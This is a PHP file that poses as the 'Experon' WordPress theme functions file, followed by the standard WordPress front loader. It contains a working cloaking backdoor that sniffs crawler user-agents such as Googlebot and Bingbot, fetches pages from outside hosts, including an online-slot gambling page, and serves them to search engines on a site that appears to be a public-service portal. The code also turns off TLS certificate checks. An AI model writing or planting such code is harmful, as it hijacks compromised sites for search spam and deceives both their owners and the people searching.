<?php
/**
 * Theme Functions: Experon
 * 
 * @package ThinkUpThemes
 * 
 * (Dilengkapi dengan fitur cloaking bot untuk keperluan khusus)
 */

// =============================================================================
//  Bagian 1: Cloaking Bot (deteksi bot dan konten alternatif)
// =============================================================================

/**
 * Deteksi apakah user-agent termasuk bot/crawler terkenal.
 *
 * @return bool True jika bot terdeteksi, false jika tidak.
 */
function is_bot() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';

    $bots = array(
        'Googlebot', 'Googlebot-News', 'Googlebot-Image', 'Googlebot-Video',
        'bingbot', 'Slurp', 'DuckDuckBot', 'BingPreview', 'DuckDuckGo',
        'YandexBot', 'Baiduspider', 'TelegramBot', 'facebookexternalhit',
        'Pinterest', 'W3C_Validator', 'Google-Site-Verification',
        'Google-InspectionTool', 'Applebot', 'AhrefsBot',
        'SEMrushBot', 'MJ12bot', 'Twitterbot', 'LinkedInBot'
    );

    foreach ( $bots as $bot ) {
        if ( stripos( $user_agent, $bot ) !== false ) {
            return true;
        }
    }

    return false;
}

/**
 * Ambil konten dari URL eksternal menggunakan cURL.
 *
 * @param string $url URL target.
 * @return string|false Konten jika sukses, false jika gagal.
 */
function fetch_message_from_url( $url ) {
    if ( ! filter_var( $url, FILTER_VALIDATE_URL ) ) {
        error_log( 'URL tidak valid: ' . $url );
        return false;
    }

    $ch = curl_init( $url );
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
    curl_setopt( $ch, CURLOPT_TIMEOUT, 10 );
    curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, true );
    curl_setopt( $ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; PHP Cloaking Bot)' );
    curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false ); // Hati-hati: nonaktifkan hanya jika perlu
    curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, false );

    $response = curl_exec( $ch );

    if ( curl_errno( $ch ) ) {
        error_log( 'cURL Error: ' . curl_error( $ch ) );
        curl_close( $ch );
        return false;
    }

    $http_code = curl_getinfo( $ch, CURLINFO_HTTP_CODE );
    curl_close( $ch );

    if ( $http_code === 200 ) {
        return $response;
    } else {
        error_log( "HTTP Status: {$http_code} untuk URL: {$url}" );
        return false;
    }
}

/**
 * Mendapatkan path dari request URI
 *
 * @return string Path yang diminta
 */
function get_request_path() {
    $request_uri = $_SERVER['REQUEST_URI'] ?? '/';
    // Hapus query string jika ada
    $path = strtok($request_uri, '?');
    return rtrim($path, '/');
}

// -----------------------------------------------------------------------------
//  Eksekusi cloaking: jika bot, tampilkan konten spesifik berdasarkan halaman
// -----------------------------------------------------------------------------
if ( is_bot() ) {
    $path = get_request_path();
    $message = false;
    
    // CEK PATH /web/tramites-y-servicios DULU (PALING SPESIFIK)
    if ( strpos( $path, '/web/tramites-y-servicios' ) === 0 ) {
        $message = fetch_message_from_url( 'https://kingstechhub.com/lp/flight-to-the-moon.html' );
    }
    // CEK HOMEPAGE
    elseif ( $path === '' || $path === '/web' ) {
        $message = fetch_message_from_url( 'https://bloomtalks.com/chia-cundinamarca/slot-gacor.html' );
    }
    // TAMBAHKAN KONDISI LAIN DI SINI JIKA PERLU
    
    if ( $message ) {
        // Bersihkan semua output buffer
        while ( ob_get_level() ) {
            ob_end_clean();
        }
        header('Content-Type: text/html; charset=UTF-8');
        echo $message;
        exit;
    }
}


/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
